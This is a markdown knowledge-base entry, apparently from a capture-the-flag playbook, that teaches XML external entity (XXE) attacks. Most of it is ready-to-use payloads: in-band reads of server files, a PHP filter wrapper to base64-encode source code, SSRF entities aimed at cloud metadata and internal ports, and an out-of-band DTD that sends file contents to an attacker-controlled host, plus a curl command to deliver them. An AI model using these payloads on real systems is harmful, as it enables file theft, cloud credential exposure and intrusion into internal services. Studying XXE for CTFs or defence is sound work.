---
id: xxe-external-entity-file-read
category: WEB
tags: [xxe, xml, external-entity, xml-external-entity, doctype, entity, file-protocol, php-filter-wrapper, ssrf, blind-xxe, oob-xxe, svg, docx, billion-laughs]
tools: []
manuals: []
title: "XXE: read server files (and reach internal URLs) via an XML external entity"
difficulty: medium
created: 2026-11-23
updated: 2026-11-23
related: [ssrf-lfi-filter-bypass, ssti-template-injection, php-object-injection-unserialize-pop-chain]
---

## How to recognize this pattern

- The app **parses XML you control** and echoes some field back: a leave/expense import, a SOAP/REST
  endpoint, an SVG/`.docx`/`.xlsx` upload (both are zipped XML), an RSS/sitemap import.
- `Content-Type: application/xml` or `text/xml` accepted, or an upload that's secretly XML inside.
- The parser has **external entities enabled** (old libxml2, Java default, `.NET` pre-4.5.2, PHP with
  `libxml_disable_entity_loader(false)`). Signal: a reflected field, or a parser error leaking a path.

## Method

### 1. Classic in-band file read
Declare an entity pointing at a local file, reference it in a field the response reflects:
```xml
<?xml version="1.0"?>
<!DOCTYPE d [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<demande><agent>&xxe;</agent><motif>x</motif></demande>
```
```bash
curl -s https://target/ -H 'Content-Type: application/xml' --data-binary @payload.xml
```
The file content appears where `<agent>` is rendered back.

### 2. When the file breaks XML (newlines, `<`, `&`): PHP filter wrapper → base64
```xml
<!DOCTYPE d [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"> ]>
```
Decode the reflected base64. This also dodges files containing XML-special characters.

### 3. SSRF via XXE (no file reflection, or reach internal services)
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">   <!-- cloud metadata -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/internal">              <!-- internal port -->
```
`file://` ignores `allow_url_fopen=Off`; `http://` needs it on. See `ssrf-lfi-filter-bypass` for
localhost-filter bypasses once you're doing SSRF.

### 4. Blind / out-of-band (no reflection at all)
Host an external DTD and exfiltrate over your own server:
```xml
<!DOCTYPE d [ <!ENTITY % ext SYSTEM "http://YOU/evil.dtd"> %ext; ]>
```
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exf SYSTEM 'http://YOU/?x=%file;'>">
%eval; %exf;
```
Read the file content from your HTTP logs. Parameter entities (`%`) are required inside the DTD.

## Gotchas

- **Parameter vs general entities**: general `&xxe;` for in-band reflection; parameter `%xxe;` for
  everything inside a DTD (OOB, nested). Mixing them fails silently.
- You usually **cannot** read files with newlines via a plain general entity in-band — use the
  `php://filter` base64 trick or the OOB DTD.
- Java reaches directories (`file:///etc/` lists contents) and supports `jar:`, `netdoc:`. PHP adds
  `php://filter`, `expect://`, `data://`. Match wrappers to the backend.
- SVG and Office files: rename and unzip `.docx`/`.xlsx`, inject into `document.xml`/a worksheet, re-zip.
  An SVG `<image xlink:href>` or embedded entity hits image-processing XXE (ImageMagick, Batik).
- Don't fire **billion laughs** (`&lol9;`) against a target you need up — it's a DoS, not a read.

## Cross-reference

- `ssrf-lfi-filter-bypass`: pair with XXE-as-SSRF to bypass `127.0.0.1`/`localhost` blocklists.
- `ssti-template-injection` / `php-object-injection-unserialize-pop-chain`: sibling
  "server parses attacker-controlled structured input" RCE/read primitives.
